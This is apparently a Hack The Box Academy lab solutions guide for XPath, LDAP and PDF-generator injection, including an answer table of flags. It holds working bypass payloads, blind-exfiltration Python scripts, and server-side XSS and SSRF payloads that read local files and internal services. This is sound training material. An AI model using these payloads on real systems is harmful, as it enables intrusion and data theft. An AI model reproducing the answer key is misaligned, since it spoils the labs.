

| Section | Question Number | Answer |
| --- | --- | --- |
| XPath - Authentication Bypass | Question 1 | HTB{baa4759ac0d153ec234a72df5d99bf56} |
| XPath - Data Exfiltration | Question 1 | HTB{47975e37f044ff05065b66f6733f86ba} |
| XPath - Advanced Data Exfiltration | Question 1 | HTB{8554c935443fec279d139a021539ea0a} |
| XPath - Blind Exploitation | Question 1 | HTB{bcc3b42debd91b5612aa80b1742f3aef} |
| LDAP - Authentication Bypass | Question 1 | HTB{cb9ab1284eafaa9e7e9ca41d70183a75} |
| LDAP - Data Exfiltration & Blind Exploitation | Question 1 | htb{cfbf8ce58a8986ab567ed5533b186515} |
| Exploitation of PDF Generation Vulnerabilities | Question 1 | HTB{2c90e0faba24f347f18dddeee0d71fb6} |
| Skills Assessment | Question 1 | HTB{9a424de6e92e0153d0c51ad602e0204f} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# XPath - Authentication Bypass

## Question 1

### "Try to use what you learned in this section to bypass authentication and retrieve the flag."

After spawning the target machine and visiting its root webpage, students need to bypass authentication by injecting a username and password such that the XPath query returns the record of the `admin`/`superuser`; to do so, students can inject a query that utilizes the `contains` function, passing the context node as the attribute and "super" as the substring to search for. Students will bypass the login portal to attain the flag `HTB{baa4759ac0d153ec234a72df5d99bf56}`:

Code: xpath

```xpath
' or contains(.,'super') or '
```

![[HTB Solutions/CWEE/z. images/d9aeff20a23a5aa81cbdf8c966d44efd_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/99288e6c9e13deb0d37a137afabd13ee_MD5.jpg]]

Alternatively, students can utilize the `position` function, specifying `3` for the element node to locate (which belongs to `superuser`):

Code: xpath

```xpath
' or position()=3 or '
```

Answer: `HTB{baa4759ac0d153ec234a72df5d99bf56}`

# XPath - Data Exfiltration

## Question 1

### "Try to use what you learned in this section to exfiltrate the flag."

After spawning the target machine and visiting its root webpage, students will notice that they can search for a street in San Francisco using a "Long" or "Short" name. Students need to provide any arbitrary data and intercept the request in `Burp Suite` to send it to `Repeater`. When sending `A` for the `q` GET parameter and `streetname` (i.e., "Short Street Name") for the `f` GET parameter, students will notice that the returned results are constrained to only child nodes of the element nodes `street` (most probably):

Code: http

```http
GET /index.php?q=A&f=streetname HTTP/1.1
```

![[HTB Solutions/CWEE/z. images/1d1c5212dbe3df9f4c27f6e4e918f3cb_MD5.jpg]]

Therefore, students need to inject an XPath payload to exfiltrate the entire XML document in an attempt to expose any other element nodes other than `street`; when injecting the payload `|//text()` in the `q` GET parameter, students will notice that no results are attained:

![[HTB Solutions/CWEE/z. images/d0ac91b056bed835bfa560d51040af9b_MD5.jpg]]

However, when injecting the payload in the `f` GET parameter, students will find other element nodes exposed in the result, including the ones for `user` (most probably), with the flag `HTB{47975e37f044ff05065b66f6733f86ba}` contained in the third `attribute node` for the `admin` user:

Code: http

```http
GET /index.php?q=A&f=streetname|//text() HTTP/1.1
```

![[HTB Solutions/CWEE/z. images/3883235100b91f6c66662833436b6652_MD5.jpg]]

Answer: `HTB{47975e37f044ff05065b66f6733f86ba}`

# XPath - Advanced Data Exfiltration

## Question 1

### "Try to use what you learned in this section to exfiltrate the flag."

After spawning the target machine and visiting its root webpage, students need to iterate through the entire XML document, to find the flag `HTB{8554c935443fec279d139a021539ea0a}` at `/*[1]/*[2]/*[3]/*[1]/*[3]`:

Code: xpath

```xpath
q=INVALID&f=fullstreetname|/*[1]/*[2]/*[3]/*[1]/*[3]
```

Code: http

```http
http://STMIP:STMPO/index.php?q=INVALID&f=fullstreetname|/*[1]/*[2]/*[3]/*[1]/*[3]
```

![[HTB Solutions/CWEE/z. images/5dcb28a298d77b107597658f9203d1a4_MD5.jpg]]

Answer: `HTB{8554c935443fec279d139a021539ea0a}`

# XPath - Blind Exploitation

## Question 1

### "Try to use what you learned in this section to exfiltrate the flag."

Students need to develop a script to automate the exfiltration of the entire XML document:

Code: python

```python
import requests, sys, string

URL = "http://STMIP:STMPO/index.php"
POSITIVE_STRING = "Message successfully sent!"

# return true if positive result, return false if negative result
def inject(payload):
	payload = f"invalid' or {payload} and '1'='1"
	r = requests.post(URL, data={'username': payload})

	if POSITIVE_STRING in r.text:
		return True
	return False

def exfiltrate_length(subquery, max_length=50):
	for i in range(max_length):
		payload = f"string-length({subquery})={i}"

		if inject(payload):
			return i
	print(f"Unable to determine length of {subquery}")
	sys.exit(0)

def exfiltrate_data(subquery):
	l = exfiltrate_length(subquery)
	data = ""
	for i in range(l):
		for c in string.printable:
			payload = f"substring({subquery},{i+1},1)='{c}'"
			if inject(payload):
				data += c
				break
	return data

def exfiltrate_no_children(subquery, mix_child=20):
	for i in range(mix_child):
		payload = f"count({subquery})={i}"
		if inject(payload):
			return i
	print(f"Unable to determine number of children of {subquery}")
	sys.exit(0)

def exfiltrate_schema(base_node, depth=0):
	name = exfiltrate_data(f'name({base_node})')
	n = exfiltrate_no_children(base_node + '/*')
	
	print(' ' * depth + f'<{name}>')

	for i in range(n):
		exfiltrate_schema(base_node + f'/*[{i+1}]', depth=depth+1)

	if n == 0:
		data = exfiltrate_data(base_node)
		print(' ' * (depth+1) + data)

	print(' ' * depth + f'</{name}>')

if __name__ == '__main__':
	print('Exfiltrating XML document:')
	exfiltrate_schema('/*[1]')
```

After running the script, students will attain the flag `HTB{bcc3b42debd91b5612aa80b1742f3aef}` as the `password` of the username `admin` account:

Code: shell

```shell
python3 poc.py
```

```
┌─[htb-ac-413848@htb-tmp0m2a18j]─[~]
└──╼ $python3 poc.py

Exfiltrating XML document:
<accounts>
 <acc>
  <username>
   admin
  </username>
  <password>
   HTB{bcc3b42debd91b5612aa80b1742f3aef}
  </password>
 </acc>
 <acc>
  <username>
   htb-stdnt
  </username>
  <password>
   295362c2618a05ba3899904a6a3f5bc0
  </password>
 </acc>
</accounts>
```

Answer: `HTB{bcc3b42debd91b5612aa80b1742f3aef}`

# LDAP - Authentication Bypass

## Question 1

### "Try to use what you learned in this section to bypass authentication for a high privilege user."

After spawning the target machine and visiting its root webpage, students need to bypass authentication by utilizing the wildcard `*` for the password field since it is not known and `*admin*` for the username field, as the hint of the question specifies that the high privilege user has the substring "admin" in their username:

![[HTB Solutions/CWEE/z. images/4e49d41169519e28a62ae931b810d4e4_MD5.jpg]]

Students will attain the flag `HTB{cb9ab1284eafaa9e7e9ca41d70183a75}`:

![[HTB Solutions/CWEE/z. images/2c9766e7d91e3b813c7a4ae62f4647b9_MD5.jpg]]

Answer: `HTB{cb9ab1284eafaa9e7e9ca41d70183a75}`

# LDAP - Data Exfiltration & Blind Exploitation

## Question 1

### "Try to use what you learned in this section to exfiltrate the description attribute of the admin user."

Students need to automate the exfiltration of the description attribute of the admin user:

Code: python

```python
import requests, string

URL = "http://STMIP:STMPO/index.php"
POSITIVE_STRING = "Login successful"
EXFILTRATE_USER = 'admin'
EXFILTRATE_ATTRIBUTE = 'description'

if __name__ == '__main__':
	stop = False
	found_char = True
	flag = ''
	
	while not stop:
		found_char = False
		for c in string.printable:
			username = f'{EXFILTRATE_USER})(|({EXFILTRATE_ATTRIBUTE}={flag}{c}*'
			password = 'invalid)'
			r = requests.post(URL, data={'username': username, 'password': password})

			if POSITIVE_STRING in r.text:
				found_char = True
				flag += c
				break

		if not found_char:
			print(flag)
			break
```

After running the script, students will know that the description attribute of the admin user is `htb{cfbf8ce58a8986ab567ed5533b186515}`:

Code: shell

```shell
python3 poc.py
```

```
┌─[htb-ac-413848@htb-tmp0m2a18j]─[~]
└──╼ $python3 poc.py

htb{cfbf8ce58a8986ab567ed5533b186515}
```

Answer: `htb{cfbf8ce58a8986ab567ed5533b186515}`

# Exploitation of PDF Generation Vulnerabilities

## Question 1

### "Try to use what you learned in this section to access an internal web application and exfiltrate the flag."

After spawning the target machine and visiting its root webpage, students will notice that they can generate PDFs of the notes; therefore, they need to click on the "+" button to add a new note:

![[HTB Solutions/CWEE/z. images/20076de332a837d5784c769f98bb62ab_MD5.jpg]]

Students need to test both fields for HTML injection by using the `bold` tag:

![[HTB Solutions/CWEE/z. images/c2d8198059dcc96f6a47c69eed96a543_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/2c49c34df28845d659c6f74af9ad3151_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/acb16638878d3255c15daf16757af0ff_MD5.jpg]]

`xdg-open` can be used to view the PDF file:

Code: shell

```shell
xdg-open pdf.pdf
```

```
┌─[htb-ac-413848@htb-87pzxy7ioq]─[~]
└──╼ $xdg-open pdf.pdf
```

Students will notice that only the "Note" content has become bold; therefore, injecting HTML is possible:

![[HTB Solutions/CWEE/z. images/f146bea8355febafe55608eb2cabb508_MD5.jpg]]

Subsequently, students need to enumerate the web server (which in this case is `Apache`) to discover what ports are listening internally by reading the contents of `/etc/apache2/ports.conf`; students will find that the internal web application is running on port 8000 (otherwise, had it been that the internal web application is running on another server (such as a Python web development framework), students can try the ports from [common-http-ports](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Infrastructure/common-http-ports.txt)):

Code: html

```html
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write((this.responseText))
	};
	x.open("GET", "file:///etc/apache2/ports.conf");
	x.send();
</script>
```

![[HTB Solutions/CWEE/z. images/38a2e2bc94732b8c109f5e7b165c1628_MD5.jpg]]

Now that the port is known, students need to interact with the internal web server:

Code: html

```html
<iframe src="http://127.0.0.1:8000/" width="800" height="500"></iframe>
```

When checking the generated PDF file attained, students will notice that the internal web application exposes the implemented endpoints, with only `/users` available:

![[HTB Solutions/CWEE/z. images/ec94f3ff58dc0cb0ad1198ad9f33f371_MD5.jpg]]

Therefore, students need to probe `/users`, to find that it exposes the location of the "keys" for `admin` and `htb-stdnt`:

Code: html

```html
<iframe src="http://127.0.0.1:8000/users" width="800" height="500"></iframe>
```

![[HTB Solutions/CWEE/z. images/17f1caf32994ae9ef95a2623efc13f72_MD5.jpg]]

Knowing that the key for `admin` is at `/users/adminkey.txt`, students need to exfiltrate its value via a `Server-Side XSS` payload, finding it to be `HTB{2c90e0faba24f347f18dddeee0d71fb6}`:

Code: html

```html
<script> x = new XMLHttpRequest(); x.onload = function(){ document.write(this.responseText) }; x.open("GET", "file:///users/adminkey.txt"); x.send(); </script>
```

![[HTB Solutions/CWEE/z. images/210662f8ca43ccffe7cc8bb9dab5d9cd_MD5.jpg]]

Answer: `HTB{2c90e0faba24f347f18dddeee0d71fb6}`

# Skills Assessment

## Question 1

### "Obtain the flag."

After spawning the target machine, students need to visit its root webpage to notice that they can generate PDF invoices for the orders they make; additionally, students will notice that there is a note that indicates there is an internal web application for tracking past orders (therefore, implying to utilize `SSRF`, if possible, to communicate with that service):

![[HTB Solutions/CWEE/z. images/ffc8bc24e9246d25c190b41a77e67172_MD5.jpg]]

Students need to test if it is possible to inject JavaScript code into the "comment" field in an attempt to exploit `Server-Side XSS`:

Code: html

```html
<script>document.write(window.location)</script>
```

![[HTB Solutions/CWEE/z. images/0512c00ced3db0e8eccea031350c057a_MD5.jpg]]

Using `xdg-open` to view the file, students will notice that the "comment" field is being sainted; therefore, `Server-Side XSS` is not possible via it:

Code: shell

```shell
xdg-open "invoice.pdf"
```

```
┌─[htb-ac-413848@htb-3kok0rd2am]─[~]
└──╼ $xdg-open "invoice.pdf"
```

![[HTB Solutions/CWEE/z. images/6e1d2707469398cf187c6189aa99d923_MD5.jpg]]

Using `Burp Suite`, students need to test if it is possible to inject JavaScript code into another field, finding that `title` is vulnerable, utilizing `Server-Side XSS` via the `title` field and chain it with `SSRF`.

Students need to enumerate the web server (which in this case is `Apache`) to discover what ports are listening internally by reading the contents of `/etc/apache2/ports.conf`; students will find that the internal web application is running on port 8000 (otherwise, had it been that the internal web application is running on another server (such as a Python web development framework), students can try the ports from [common-http-ports](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Infrastructure/common-http-ports.txt)):

```html
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write((this.responseText))
	};
	x.open("GET", "file:///etc/apache2/ports.conf");
	x.send();
</script>
```

It's important that the injected code is placed as the `title` field and not the `comment` one:

![[HTB Solutions/CWEE/z. images/156b59c113a03915bb925068e20c84d4_MD5.jpg]]

```http
id=1&title=%3Cscript%3E%0D%0A%09x+%3D+new+XMLHttpRequest%28%29%3B%0D%0A%09x.onload+%3D+function%28%29%7B%0D%0A%09%09document.write%28%28this.responseText%29%29%0D%0A%09%7D%3B%0D%0A%09x.open%28%22GET%22%2C+%22file%3A%2F%2F%2Fetc%2Fapache2%2Fports.conf%22%29%3B%0D%0A%09x.send%28%29%3B%0D%0A%3C%2Fscript%3E&desc=Our+custom+CPU+with+the+most+cores+and+the+highest+clock+speed+in+the+world.&comment=comment
```

![[HTB Solutions/CWEE/z. images/c41c61939dbc6f5554f67e8cb3d3f8a4_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/736c33e859048dca884b2e1377de4585_MD5.jpg]]

Now that the port is known, students need to interact with the internal web server:

```html
<iframe src="http://127.0.0.1:8000/" width="800" height="500"></iframe>
```

![[HTB Solutions/CWEE/z. images/e3787f6a6c6baf04f8eb9b25fdbb564b_MD5.jpg]]

```http
id=1&title=%3Ciframe+src%3D%22http%3A%2F%2F127.0.0.1%3A8000%2F%22+width%3D%22800%22+height%3D%22500%22%3E%3C%2Fiframe%3E&desc=Our+custom+CPU+with+the+most+cores+and+the+highest+clock+speed+in+the+world.&comment=comment
```

After forwarding the request and viewing the PDF attained, students will notice that the internal web application allows viewing orders by querying an XML document and specifying the order ID via the `q` GET parameter (as implied by the "Note to dev" note):

![[HTB Solutions/CWEE/z. images/56eb645fcca8589c599106af59f40b9f_MD5.jpg]]

Subsequently, students need to exfiltrate the flag by injecting an XPath payload that will return the element with the substring "HTB", finding it to be `HTB{9a424de6e92e0153d0c51ad602e0204f}`:

```html
<iframe src="http://127.0.0.1:8000/?q=INVALID or contains(.,'HTB')" width="800" height="500"></iframe>
```
```http
id=1&title=%3Ciframe+src%3D%22http%3A%2F%2F127.0.0.1%3A8000%2F%3Fq%3DINVALID+or+contains%28.%2C%27HTB%27%29%22+width%3D%22800%22+height%3D%22500%22%3E%3C%2Fiframe%3E&desc=Our+custom+CPU+with+the+most+cores+and+the+highest+clock+speed+in+the+world.&comment=comment
```

![[HTB Solutions/CWEE/z. images/7fbcfdfdc3e87d0798c27006efd4a4cd_MD5.jpg]]

Alternatively, students can also make the substring to search for to be "Flag":

```html
<iframe src="http://127.0.0.1:8000/?q=INVALID or contains(.,'Flag')" width="800" height="500"></iframe>
```
```http
id=1&title=%3Ciframe+src%3D%22http%3A%2F%2F127.0.0.1%3A8000%2F%3Fq%3DINVALID+or+contains%28.%2C%27Flag%27%29%22+width%3D%22800%22+height%3D%22500%22%3E%3C%2Fiframe%3E&desc=Our+custom+CPU+with+the+most+cores+and+the+highest+clock+speed+in+the+world.&comment=comment
```

![[HTB Solutions/CWEE/z. images/4eb33a5007dce4ce3cd87c826ea428cc_MD5.jpg]]

At last, instead of using the `contains` function, students can utilize the `position` function with the value 7 to attain the flag:

```html
<iframe src="http://127.0.0.1:8000/?q=INVALID or position()=7" width="800" height="500"></iframe>
```
```http
id=1&title=%3Ciframe+src%3D%22http%3A%2F%2F127.0.0.1%3A8000%2F%3Fq%3DINVALID+or+position%28%29%3D7%22+width%3D%22800%22+height%3D%22500%22%3E%3C%2Fiframe%3E&desc=Our+custom+CPU+with+the+most+cores+and+the+highest+clock+speed+in+the+world.&comment=comment
```

![[HTB Solutions/CWEE/z. images/86cbd7892e614054e366b33048e65bf8_MD5.jpg]]

Answer: `HTB{9a424de6e92e0153d0c51ad602e0204f}`